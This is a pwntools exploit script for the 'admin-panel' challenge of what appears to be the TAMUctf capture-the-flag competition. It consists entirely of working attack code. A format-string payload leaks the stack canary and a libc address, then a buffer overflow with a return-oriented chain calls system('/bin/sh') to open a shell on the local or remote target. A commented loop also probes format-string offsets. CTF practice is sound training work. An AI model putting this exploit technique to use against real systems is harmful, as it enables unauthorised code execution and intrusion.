#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./admin-panel_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}

# for i in range(1, 64):
#     with context.quiet:
#         io = start()

#     io.sendlineafter(b"16:\n", b"admin")

#     payload = b"secretpass123".ljust(0x20, b"\x00")
#     payload += f"%{i}$p".encode()

#     io.sendlineafter(b"24:\n", payload)
#     io.recvline()
#     leak = io.recvline()
#     log.info(f"{i:02x}: {leak}")

#     with context.quiet:
#         io.close()

canary_offset = 0xf
libc_addr_offset = 0x5

io = start()

io.sendlineafter(b"16:\n", b"admin")

payload = b"secretpass123".ljust(0x20, b"\x00")
payload += f"%{canary_offset}$p|%{libc_addr_offset}$p".encode()

io.sendlineafter(b"24:\n", payload)
io.recvline()
canary, libc_leak = map(lambda x: int(x, 16),
                        io.recvline().decode().split("|"))
libc.address = libc_leak - 0x179e80
log.info(f"{canary=:#x}")
log.info(f"{libc.address=:#x}")

pause()
io.sendlineafter(b"3: \n", b"2")

pop_rdi = libc.address + 0x001667ca
ret = pop_rdi + 1
payload = b"A" * (0x50 - 8)
payload += flat(canary,
                p64(0),
                pop_rdi,
                libc.search(b"/bin/sh\x00").__next__(),
                ret,
                libc.sym["system"])
io.sendlineafter(b"wrong:\n", payload)

io.interactive()
